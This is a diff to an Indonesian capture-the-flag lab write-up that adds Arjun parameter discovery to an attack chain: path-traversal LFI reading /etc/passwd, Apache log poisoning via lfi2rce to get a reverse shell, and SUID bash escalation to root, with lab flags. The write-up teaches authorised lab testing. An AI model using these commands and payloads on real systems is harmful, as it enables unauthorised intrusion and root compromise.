@@ -1,4 +1,4 @@
-# 02 Write-Up Lab SIPADU
+# 05 Write-Up Lab SIPADU
 ## Local File Inclusion → Apache Access Log Poisoning → RCE `www-data` → SUID Bash → Root
 
 > **Khusus untuk ujian, laboratorium, CTF, atau pengujian keamanan yang telah memperoleh izin.**
@@ -26,7 +26,9 @@ TARGET              = 192.168.56.13
 NETWORK             = 192.168.56.0/24
 WEB_PORTS           = 80, 8081
 WEB                 = http://192.168.56.13:8081
+PARAM_DISCOVERY_TOOL = Arjun v2.2.7
 LFI_PARAMETER       = page
+ARJUN_EVIDENCE      = Parameters found: page
 LFI_TEST            = ../../../../etc/passwd
 SERVICE             = Apache httpd 2.4.67 (Debian)
 APPLICATION         = SIPADU - Persuratan & Arsip Digital
@@ -51,7 +53,8 @@ ROOT_FLAG           = /root/flag.txt
 Host discovery 192.168.56.0/24
 → target 192.168.56.13 ditemukan
 → Nmap menemukan Apache pada port 80 dan 8081
-→ parameter page diuji dengan path traversal
+→ Arjun menganalisis endpoint dan menemukan parameter page
+→ parameter page divalidasi dengan path traversal
 → /etc/passwd berhasil dibaca
 → LFI dikonfirmasi
 → Apache access.log diracuni dengan payload
@@ -86,7 +89,9 @@ Alur lengkap:
 Nmap discovery
 → identifikasi target SIPADU
 → validasi port 8081
-→ uji parameter ?page=
+→ temukan parameter tersembunyi menggunakan Arjun
+→ Arjun menemukan parameter page
+→ uji ?page= dengan path traversal
 → baca /etc/passwd
 → siapkan dependency lfi2rce
 → atur callback WSL melalui Windows portproxy
@@ -114,6 +119,8 @@ Nmap discovery
 | Port terbuka | `80/tcp`, `8081/tcp` |
 | Web server | `Apache httpd 2.4.67 (Debian)` |
 | Judul aplikasi | `SIPADU - Arsip & Persuratan Digital | Setda` |
+| Tool parameter discovery | `Arjun v2.2.7` |
+| Parameter ditemukan | `page` |
 | Parameter rentan | `page` |
 | Bukti LFI | `/etc/passwd` dapat dibaca |
 | Tool foothold | `lfi2rce` v1.1 |
@@ -210,9 +217,11 @@ whatweb http://192.168.56.13:8081/
 
 ---
 
-## 5. Fase 3 — Menemukan Parameter LFI
+## 5. Fase 3 — Menemukan Parameter `page`
 
-### Observasi Aplikasi
+Sebelum menguji LFI, penguji perlu mengetahui parameter yang diproses oleh aplikasi. Parameter dapat ditemukan melalui observasi URL secara manual atau menggunakan tool parameter discovery seperti **Arjun**.
+
+### 5.1 Opsi A — Observasi Manual
 
 Aplikasi menggunakan parameter `page` untuk menentukan konten yang dimuat:
 
@@ -222,19 +231,109 @@ http://192.168.56.13:8081/?page=<nilai>
 
 Parameter yang mengendalikan nama file atau template merupakan titik yang perlu diuji terhadap path traversal.
 
-### Payload dari Capture
+Metode manual cukup apabila parameter sudah terlihat pada URL, link navigasi, source HTML, JavaScript, atau request yang ditangkap melalui Burp Suite.
+
+---
+
+### 5.2 Opsi B — Menemukan Parameter Menggunakan Arjun
+
+#### Tujuan
+
+Mengidentifikasi parameter HTTP yang diterima endpoint meskipun parameter tersebut belum diketahui atau tidak terlihat langsung pada halaman.
+
+#### Instalasi Arjun — Jika Belum Tersedia
+
+Di dalam virtual environment:
+
+```bash
+cd ~/Downloads
+source .venv/bin/activate
+python -m pip install arjun
+```
+
+Alternatif menggunakan `pipx`:
+
+```bash
+pipx install arjun
+```
+
+Validasi:
+
+```bash
+arjun --help
+```
+
+#### Command dari Capture
+
+```bash
+arjun -u "http://192.168.56.13:8081"
+```
+
+#### Output Evidence Aktual
+
+```text
+Arjun v2.2.7
+
+[*] Scanning 0/1: http://192.168.56.13:8081
+[*] Probing the target for stability
+[*] Analysing HTTP response for anomalies
+[*] Logicforcing the URL endpoint
+[✓] parameter detected: page, based on: body length
+[+] Parameters found: page
+```
+
+#### Makna Output
+
+Arjun melakukan beberapa langkah:
+
+1. memeriksa kestabilan respons endpoint;
+2. mengirim kandidat parameter;
+3. membandingkan respons normal dengan respons setelah parameter ditambahkan;
+4. mendeteksi anomali pada panjang body;
+5. menyimpulkan bahwa endpoint memproses parameter `page`.
+
+Evidence utamanya adalah:
+
+```text
+parameter detected: page, based on: body length
+Parameters found: page
+```
+
+Dengan demikian, format endpoint yang perlu diuji adalah:
+
+```text
+http://192.168.56.13:8081/?page=<payload>
+```
+
+> **Catatan penting:** Arjun hanya membuktikan bahwa parameter `page` diproses oleh aplikasi. Hasil tersebut belum membuktikan adanya LFI. Kerentanan tetap harus divalidasi dengan payload path traversal dan evidence pembacaan file lokal.
+
+#### Simpan Hasil — Opsional
+
+```bash
+arjun \
+  -u "http://192.168.56.13:8081" \
+  -oJ arjun_sipadu.json
+```
+
+Hasil JSON dapat digunakan sebagai evidence atau input pengujian lanjutan.
+
+---
+
+### 5.3 Validasi Parameter terhadap LFI
+
+Payload dari capture:
 
 ```text
 ../../../../etc/passwd
 ```
 
-### Pengujian melalui Browser
+#### Pengujian melalui Browser
 
 ```text
 http://192.168.56.13:8081/?page=../../../../etc/passwd
 ```
 
-### Pengujian melalui Curl
+#### Pengujian melalui Curl
 
 ```bash
 BASE="http://192.168.56.13:8081"
@@ -242,7 +341,7 @@ BASE="http://192.168.56.13:8081"
 curl -s "$BASE/?page=../../../../etc/passwd"
 ```
 
-### Output Evidence
+#### Output Evidence
 
 Halaman SIPADU menampilkan isi `/etc/passwd`, termasuk akun lokal:
 
@@ -252,10 +351,11 @@ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 petugas:x:1000:1000::/home/petugas:/bin/bash
 ```
 
-### Makna Output
+#### Makna Output
 
 Keberhasilan membaca `/etc/passwd` membuktikan bahwa:
 
+- Arjun berhasil menemukan parameter yang benar;
 - input `page` tidak dibatasi pada daftar template yang diizinkan;
 - traversal `../` dapat keluar dari direktori aplikasi;
 - aplikasi membaca dan menampilkan file lokal;
@@ -940,7 +1040,7 @@ cd ~/Downloads
 python3 -m venv .venv
 source .venv/bin/activate
 python -m pip install --upgrade pip
-python -m pip install requests paramiko
+python -m pip install requests paramiko arjun
 ```
 
 Validasi:
@@ -1034,7 +1134,48 @@ netsh interface portproxy add v4tov4 `
 
 ---
 
-### 18.5 `/etc/passwd` Tidak Tampil
+### 18.5 Arjun Tidak Menemukan Parameter `page`
+
+Pastikan URL target dapat diakses:
+
+```bash
+curl -i "http://192.168.56.13:8081/"
+```
+
+Jalankan kembali Arjun dengan URL yang sama seperti endpoint aplikasi:
+
+```bash
+arjun -u "http://192.168.56.13:8081"
+```
+
+Apabila aplikasi menggunakan path tertentu, sertakan path tersebut:
+
+```bash
+arjun -u "http://192.168.56.13:8081/index.php"
+```
+
+Penyebab umum parameter tidak terdeteksi:
+
+- endpoint salah atau redirect tidak diikuti dengan benar;
+- aplikasi membutuhkan cookie atau header tertentu;
+- respons aplikasi tidak stabil;
+- parameter hanya diproses pada metode POST;
+- WAF atau rate limiting memengaruhi respons;
+- parameter sudah terlihat manual sehingga discovery otomatis tidak diperlukan.
+
+Periksa redirect:
+
+```bash
+curl -iL "http://192.168.56.13:8081/"
+```
+
+Apabila aplikasi memerlukan session, tangkap request melalui Burp Suite dan gunakan parameter yang terlihat pada request aktual.
+
+> Arjun merupakan metode alternatif untuk menemukan kandidat parameter. Jika Arjun tidak menemukan parameter, observasi URL, source HTML, JavaScript, Burp Proxy HTTP history, dan form aplikasi tetap harus dilakukan.
+
+---
+
+### 18.6 `/etc/passwd` Tidak Tampil
 
 Uji beberapa kedalaman traversal:
 
@@ -1053,7 +1194,7 @@ curl -s "$BASE/?page=../../../../etc/passwd" | grep 'root:x:0:0'
 
 ---
 
-### 18.6 Log Poisoning Tidak Menghasilkan Shell
+### 18.7 Log Poisoning Tidak Menghasilkan Shell
 
 Validasi dahulu apakah access log dapat dibaca:
 
@@ -1078,7 +1219,7 @@ Lokasi pada capture SIPADU adalah:
 
 ---
 
-### 18.7 `bash -p` Tidak Menghasilkan Root
+### 18.8 `bash -p` Tidak Menghasilkan Root
 
 Periksa permission:
 
@@ -1122,6 +1263,8 @@ nmap -sn 192.168.56.0/24
 → target 192.168.56.13
 → nmap -sC -sV 192.168.56.13
 → Apache 80/8081
+→ arjun -u http://192.168.56.13:8081
+→ Parameters found: page
 → ?page=../../../../etc/passwd
 → /etc/passwd tampil
 → venv + requests + paramiko
@@ -1326,6 +1469,7 @@ Secara keseluruhan, exploit chain memiliki dampak **Critical** karena attacker t
 |---|---|
 | Host discovery | Output `nmap -sn` dan target `192.168.56.13` |
 | Service enumeration | Port 80/8081, Apache 2.4.67 Debian, title SIPADU |
+| Parameter discovery | Arjun menemukan `page` berdasarkan perbedaan body length |
 | LFI | URL traversal dan isi `/etc/passwd` |
 | User enumeration | Baris akun `petugas` dan `www-data` |
 | Tool preparation | Virtual environment dan dependency `paramiko` |
@@ -1344,7 +1488,9 @@ Secara keseluruhan, exploit chain memiliki dampak **Critical** karena attacker t
 
 ```text
 Aplikasi SIPADU pada 192.168.56.13:8081 memiliki kerentanan Local File
-Inclusion pada parameter `page`. Payload path traversal berhasil membaca
+Inclusion pada parameter `page`. Parameter tersebut dapat ditemukan secara manual
+maupun melalui Arjun, yang mendeteksi anomali panjang body dan menampilkan
+`Parameters found: page`. Payload path traversal kemudian berhasil membaca
 /etc/passwd dan mengungkap informasi account lokal. Kerentanan tersebut dapat
 ditingkatkan menjadi remote code execution melalui Apache access log poisoning.
 Payload yang dicatat pada /var/log/apache2/access.log dimuat kembali melalui
@@ -1395,7 +1541,31 @@ SIPADU - Arsip & Persuratan Digital | Setda
 
 ---
 
-## 3. Validasi LFI
+## 3. Temukan Parameter dengan Arjun — Alternatif
+
+```bash
+source ~/Downloads/.venv/bin/activate 2>/dev/null || true
+arjun -u "$BASE"
+```
+
+Expected:
+
+```text
+parameter detected: page, based on: body length
+Parameters found: page
+```
+
+Hasil Arjun menentukan URL pengujian berikut:
+
+```text
+http://192.168.56.13:8081/?page=
+```
+
+> Langkah ini menemukan kandidat parameter. Validasi LFI tetap dilakukan pada langkah berikutnya.
+
+---
+
+## 4. Validasi LFI
 
 ```bash
 curl -s "$BASE/?page=../../../../etc/passwd" | grep -E 'root:|www-data:|petugas:'
@@ -1411,7 +1581,7 @@ petugas:x:1000:1000::/home/petugas:/bin/bash
 
 ---
 
-## 4. Setup Python
+## 5. Setup Python
 
 ```bash
 cd ~/Downloads
@@ -1423,7 +1593,7 @@ python -m pip install requests paramiko
 
 ---
 
-## 5. Setup Portproxy — PowerShell Administrator
+## 6. Setup Portproxy — PowerShell Administrator
 
 ```powershell
 netsh interface portproxy add v4tov4 `
@@ -1445,7 +1615,7 @@ netsh interface portproxy show v4tov4
 
 ---
 
-## 6. Bersihkan Port Lama
+## 7. Bersihkan Port Lama
 
 ```bash
 sudo fuser -k 12345/tcp 2>/dev/null
@@ -1456,7 +1626,7 @@ Output pemeriksaan terakhir harus kosong.
 
 ---
 
-## 7. Jalankan Exploit
+## 8. Jalankan Exploit
 
 ```bash
 python lfi2rce \
@@ -1477,7 +1647,7 @@ connect to [172.26.59.55] from [172.26.48.1] ...
 
 ---
 
-## 8. Setelah Shell Masuk
+## 9. Setelah Shell Masuk
 
 ```bash
 id
@@ -1494,7 +1664,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ---
 
-## 9. User Flag
+## 10. User Flag
 
 ```bash
 find / -type f -iname "*flag*" 2>/dev/null
@@ -1509,7 +1679,7 @@ FLAG{l0g_p01s0n_lfi_2c7a9e41}
 
 ---
 
-## 10. Privilege Escalation
+## 11. Privilege Escalation
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -1529,7 +1699,7 @@ root
 
 ---
 
-## 11. Root Flag
+## 12. Root Flag
 
 ```bash
 find / -type f -iname "*flag*" 2>/dev/null
@@ -1560,6 +1730,8 @@ TARGET="192.168.56.13"
 BASE="http://$TARGET:8081"
 
 nmap -sC -sV "$TARGET"
+arjun -u "$BASE"
+# Expected: Parameters found: page
 curl -s "$BASE/?page=../../../../etc/passwd" | grep -E 'root:|petugas:'
 
 cd ~/Downloads
@@ -1598,7 +1770,7 @@ cat /root/flag.txt
 # Alur Hafalan Akhir
 
 ```text
-DISCOVER → ENUMERATE → LFI → PASSWD → WSL PORTPROXY → LOG POISON → WWW-DATA → USER FLAG → SUID BASH → BASH -P → ROOT FLAG
+DISCOVER → ENUMERATE → ARJUN PAGE → LFI → PASSWD → WSL PORTPROXY → LOG POISON → WWW-DATA → USER FLAG → SUID BASH → BASH -P → ROOT FLAG
 ```
 
 ## Mnemonic
@@ -1607,7 +1779,7 @@ DISCOVER → ENUMERATE → LFI → PASSWD → WSL PORTPROXY → LOG POISON → W
 S.I.P.A.D.U
 
 S = Scan jaringan dan service
-I = Include /etc/passwd melalui parameter page
+I = Identify parameter `page` dengan Arjun, lalu include `/etc/passwd`
 P = Poison Apache access.log
 A = Access shell sebagai www-data
 D = Discover SUID /usr/bin/bash
